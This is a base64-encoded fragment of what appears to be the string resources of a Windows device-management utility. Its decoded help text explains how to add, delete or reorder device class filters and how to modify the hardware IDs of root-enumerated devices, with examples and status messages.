cgAgAG8AYwBjAHUAcABpAGUAcwAgAHQAaABlACAAcABvAHMAaQB0AGkAbwBuACAAbwBmACAAdABoAGUAIABkAGUAbABlAHQAZQBkACAAZgBpAGwAdABlAHIALgAgAA0ACgAgACAAIAAgACAAIAAgACAAIABTAHUAYgBzAGUAcQB1AGUAbgB0ACAALQAgAG8AcgAgACsAIABzAHUAYgBjAG8AbQBtAGEAbgBkAHMAIABpAG4AcwBlAHIAdAAgAGEAIABuAGUAdwAgAGYAaQBsAHQAZQByACAAYQB0ACAAdABoAGUAIABjAHUAcgBzAG8AcgAgAHAAbwBzAGkAdABpAG8AbgAuAA0ACgANAAoADQAKAEUAeABhAG0AcABsAGUAcwA6AA0ACgBJAGYAIAB0AGgAZQAgAHUAcABwAGUAcgAgAGYAaQBsAHQAZQByAHMAIABmAG8AcgAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwAgACIAZgBvAG8AIgAgAGEAcgBlACAAQQAsAEIALABDACwAQgAsAEQALABCACwARQA6AA0ACgAlADEAIAAlADIAIABmAG8AbwAgAHUAcABwAGUAcgAgAEAARAAgACEAQgAgACAAIAAgAC0AIABkAGUAbABlAHQAZQBzACAAdABoAGUAIAB0AGgAaQByAGQAIAAnAEIAJwAuAA0ACgAlADEAIAAlADIAIABmAG8AbwAgAHUAcABwAGUAcgAgACEAQgAgACEAQgAgACEAQgAgAC0AIABkAGUAbABlAHQAZQBzACAAYQBsAGwAIAB0AGgAcgBlAGUAIABpAG4AcwB0AGEAbgBjAGUAcwAgAG8AZgAgACcAQgAnAC4ADQAKACUAMQAgACUAMgAgAGYAbwBvACAAdQBwAHAAZQByACAAPQAhAEIAIAA9ACEAQQAgACAALQAgAGQAZQBsAGUAdABlAHMAIAB0AGgAZQAgAGYAaQByAHMAdAAgACcAQgAnACAAYQBuAGQAIAB0AGgAZQAgAGYAaQByAHMAdAAgACcAQQAnAC4ADQAKACUAMQAgACUAMgAgAGYAbwBvACAAdQBwAHAAZQByACAAIQBDACAAKwBDAEMAIAAgACAALQAgAHIAZQBwAGwAYQBjAGUAcwAgACcAQwAnACAAdwBpAHQAaAAgACcAQwBDACcALgANAAoAJQAxACAAJQAyACAAZgBvAG8AIAB1AHAAcABlAHIAIABAAEQAIAAtAEMAQwAgACAAIAAtACAAaQBuAHMAZQByAHQAcwAgACcAQwBDACcAIABiAGUAZgBvAHIAZQAgACcARAAnAC4ADQAKACUAMQAgACUAMgAgAGYAbwBvACAAdQBwAHAAZQByACAAQABEACAAKwBDAEMAIAAgACAALQAgAGkAbgBzAGUAcgB0AHMAIAAnAEMAQwAnACAAYQBmAHQAZQByACAAJwBEACcALgANAAoAJQAxACAAJQAyACAAZgBvAG8AIAB1AHAAcABlAHIAIAAtAEMAQwAgACAAIAAgACAAIAAtACAAaQBuAHMAZQByAHQAcwAgACcAQwBDACcAIABiAGUAZgBvAHIAZQAgACcAQQAnAC4ADQAKACUAMQAgACUAMgAgAGYAbwBvACAAdQBwAHAAZQByACAAKwBDAEMAIAAgACAAIAAgACAALQAgAGkAbgBzAGUAcgB0AHMAIAAnAEMAQwAnACAAYQBmAHQAZQByACAAJwBFACcALgANAAoAJQAxACAAJQAyACAAZgBvAG8AIAB1AHAAcABlAHIAIABAAEQAIAArAFgAIAArAFkAIAAtACAAaQBuAHMAZQByAHQAcwAgACcAWAAnACAAYQBmAHQAZQByACAAJwBEACcAIABhAG4AZAAgACcAWQAnACAAYQBmAHQAZQByACAAJwBYACcALgANAAoAJQAxACAAJQAyACAAZgBvAG8AIAB1AHAAcABlAHIAIABAAEQAIAAtAFgAIAAtAFkAIAAtACAAaQBuAHMAZQByAHQAcwAgACcAWAAnACAAYgBlAGYAbwByAGUAIAAnAEQAJwAgAGEAbgBkACAAJwBZACcAIABiAGUAZgBvAHIAZQAgACcAWAAnAC4ADQAKACUAMQAgACUAMgAgAGYAbwBvACAAdQBwAHAAZQByACAAQABEACAALQBYACAAKwBZACAALQAgAGkAbgBzAGUAcgB0AHMAIAAnAFgAJwAgAGIAZQBmAG8AcgBlACAAJwBEACcAIABhAG4AZAAgACcAWQAnACAAYgBlAHQAdwBlAGUAbgAgACcAWAAnACAAYQBuAGQAIAAnAEQAJwAuAA0ACgAAAAAAbAABACUAMQAhAC0AMgAwAHMAIQAgAEEAZABkACwAIABkAGUAbABlAHQAZQAsACAAYQBuAGQAIAByAGUAbwByAGQAZQByACAAYwBsAGEAcwBzACAAZgBpAGwAdABlAHIAcwAuAA0ACgAAAAAAxAABAEMAbABhAHMAcwAgAGYAaQBsAHQAZQByAHMAIABjAGgAYQBuAGcAZQBkAC4AIABSAGUAcwB0AGEAcgB0ACAAdABoAGUAIABkAGUAdgBpAGMAZQBzACAAbwByACAAcgBlAGIAbwBvAHQAIAB0AGgAZQAgAHMAeQBzAHQAZQBtACAAdABvACAAbQBhAGsAZQAgAHQAaABlACAAYwBoAGEAbgBnAGUAIABlAGYAZgBlAGMAdABpAHYAZQAuAA0ACgAAADwAAQBDAGwAYQBzAHMAIABmAGkAbAB0AGUAcgBzACAAdQBuAGMAaABhAG4AZwBlAGQALgANAAoAAAAAAKQHAQAlADEAIABbAC0AbQA6AFwAXAA8AG0AYQBjAGgAaQBuAGUAPgBdACAAJQAyACAAPABpAGQAPgAgAFsAPABpAGQAPgAuAC4ALgBdACAAOgA9ACAAPABzAHUAYgBjAG0AZABzAD4ADQAKACUAMQAgAFsALQBtADoAXABcADwAbQBhAGMAaABpAG4AZQA+AF0AIAAlADIAIAA9ADwAYwBsAGEAcwBzAD4AIABbADwAaQBkAD4ALgAuAC4AXQAgADoAPQAgADwAcwB1AGIAYwBtAGQAcwA+AA0ACgBNAG8AZABpAGYAaQBlAHMAIAB0AGgAZQAgAGgAYQByAGQAdwBhAHIAZQAgAEkARAAnAHMAIABvAGYAIAB0AGgAZQAgAGwAaQBzAHQAZQBkACAAZABlAHYAaQBjAGUAcwAuACAAVABoAGkAcwAgAGMAbwBtAG0AYQBuAGQAIAB3AGkAbABsACAAbwBuAGwAeQAgAHcAbwByAGsAIABmAG8AcgAgAHIAbwBvAHQALQBlAG4AdQBtAGUAcgBhAHQAZQBkACAAZABlAHYAaQBjAGUAcwAuAA0ACgBUAGgAaQBzACAAYwBvAG0AbQBhAG4AZAAgAHcAaQBsAGwAIAB3AG8AcgBrACAAZgBvAHIAIABhACAAcgBlAG0AbwB0AGUAIABtAGEAYwBoAGkAbgBlAC4ADQAKAEUAeABhAG0AcABsAGUAcwAgAG8AZgAgADwAaQBkAD4AIABhAHIAZQA6AA0ACgAqACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0AIABBAGwAbAAgAGQAZQB2AGkAYwBlAHMAIAAoAG4AbwB0ACAAcgBlAGMAbwBtAG0AZQBuAGQAZQBkACkADQAKAEkAUwBBAFAATgBQAFwAUABOAFAAMAA2ADAAMQAgACAAIAAgACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAANAAoAKgBQAE4AUAAqACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEACAAdwBpAHQAaAAgAHcAaQBsAGQAYwBhAHIAZABzACAAKAAqACAAbQBhAHQAYwBoAGUAcwAgAGEAbgB5AHQAaABpAG4AZwApAA0ACgBAAFIATwBPAFQAXAAqAFwAKgAgACAAIAAgACAAIAAgACAAIAAgAC0AIABJAG4AcwB0AGEAbgBjAGUAIABJAEQAIAB3AGkAdABoACAAdwBpAGwAZABjAGEAcgBkAHMAIAAoAEAAIABwAHIAZQBmAGkAeABlAHMAIABpAG4AcwB0AGEAbgBjAGUAIABJAEQAKQANAAoAPABjAGwAYQBzAHMAPgAgAGkAcwAgAGEAIABzAGUAdAB1AHAAIABjAGwAYQBzAHMAIABuAGEAbQBlACAAYQBzACAAbwBiAHQAYQBpAG4AZQBkACAAZgByAG8AbQAgAHQAaABlACAAYwBsAGEAcwBzAGUAcwAgAGMAbwBtAG0AYQBuAGQALgANAAoADQAKADwAcwB1AGIAYwBtAGQAcwA+ACAAYwBvAG4AcwBpAHMAdABzACAAbwBmACAAbwBuAGUAIABvAHIAIABtAG8AcgBlADoADQAKAD0AaAB3AGkAZAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAgAEMAbABlAGEAcgAgAGgAYQByAGQAdwBhAHIAZQAgAEkARAAgAGwAaQBzAHQAIABhAG4AZAAgAHMAZQB0ACAAaQB0ACAAdABvACAAaAB3AGkAZAAuAA0ACgArAGgAdwBpAGQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0AIABBAGQAZAAgAG8AcgAgAG0AbwB2AGUAIABoAGEAcgBkAHcAYQByAGUAIABJAEQAIAB0AG8AIABoAGUAYQBkACAAbwBmACAAbABpAHMAdAAgACgAYgBlAHQAdABlAHIAIABtAGEAdABjAGgAKQAuAA0ACgAtAGgAdwBpAGQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0AIABBAGQAZAAgAG8AcgAgAG0AbwB2AGUAIABoAGEAcgBkAHcAYQByAGUAIABJAEQAIAB0AG8AIABlAG4AZAAgAG8AZgAgAGwAaQBzAHQAIAAoAHcAbwByAHMAZQAgAG0AYQB0AGMAaAApAC4ADQAKACEAaAB3AGkAZAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAgAFIAZQBtAG8AdgBlACAAaABhAHIAZAB3AGEAcgBlACAASQBEACAAZgByAG8AbQAgAGwAaQBzAHQALgANAAoAaAB3AGkAZAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtACAAZQBhAGMAaAAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABoAGEAcgBkAHcAYQByAGUAIABpAGQAIABpAHMAIABpAG4AcwBlAHIAdABlAGQAIABhAGYAdABlAHIAIAB0AGgAZQAgAHAAcgBlAHYAaQBvAHUAcwAuAA0ACgAAAIwAAQAlADEAIQAtADIAMABzACEAIABNAG8AZABpAGYAeQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAAnAHMAIABvAGYAIABsAGkAcwB0AGUAZAAgAHIAbwBvAHQALQBlAG4AdQBtAGUAcgBhAHQAZQBkACAAZABlAHYAaQBjAGUAcwAuAA0ACgAAAAAAQAABAE4AbwAgAGgAYQByAGQAdwBhAHIAZQAgAEkARAAnAHMAIABtAG8AZABpAGYAaQBlAGQALgANAAoAAAAAAKgAAQBTAGsAaQBwAHAAZQBkACAAJQAxACEAdQAhACAAbgBvAG4ALQByAG8AbwB0ACAAZABlAHYAaQBjAGUAKABzACkALAAgAG0AbwBkAGkAZgBpAGUAZAAgAHQAaABlACAAaABhAHIAZAB3AGEAcgBlACAASQBEACAAbwBuACAAJQAyACEAdQAhACAAZABlAHYAaQBjAGUAKABzACkALgANAAoAAAAAAGQAAQBNAG8AZABpAGYAaQBlAGQAIAB0AGgAZQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAAgAG8AbgAgACUAMQAhAHUAIQAgAGQAZQB2AGkAYwBlACgAcwApAC4ADQAKAAAAAABIAAEAUwBrAGkAcABwAGkAbgBnACAAKABOAG8AdAAgAHIAbwBvAHQALQBlAG4AdQBtAGUAcgBhAHQAZQBkACkALgANAAoAAAAAAAAAAAAAAAAAAAAAAAAABwBFAG4AYQBiAGwAZQBkABEARQBuAGEAYgBsAGUAZAAgAG8AbgAgAHIAZQBiAG8AbwB0AA0ARQBuAGEAYgBsAGUAIABmAGEAaQBsAGUAZAAIAEQAaQBzAGEAYgBsAGUAZAASAEQAaQBzAGEAYgBsAGUAZAAgAG8AbgAgAHIAZQBiAG8AbwB0AA4ARABpAHMAYQBiAGwAZQAgAGYAYQBpAGwAZQBkAAkAUgBlAHMAdABhAHIAdABlAGQADwBSAGUAcQB1AGkAcgBlAHMAIAByAGUAYgBvAG8AdAAAAAAAAAAOAFIAZQBzAHQAYQByAHQAIABmAGEAaQBsAGUAZAAHAFIAZQBtAG8AdgBlAGQAEQBSAGUAbQBvAHYAZQBkACAAbwBuACAAcgBlAGIAbwBvAHQADQBSAGUAbQBvAHYAZQAgAGYAYQBpAGwAZQBkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAAgAAAAAKAIoGiggKCIoJCg+KQApRClKKUwpQAAAKAAAHAAAAAAoAigGKAgoDCgOKBIoFCgYKBooHiggKCQoJigqKCwoMCgyKDYoOCg8KD4oAihEKEgoSihOKFAoVChWKFooXChgKGIoZihoKGwobihyKHQoeCh6KH4oQCiEKIYoiiiMKJAokiiWKJgogAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
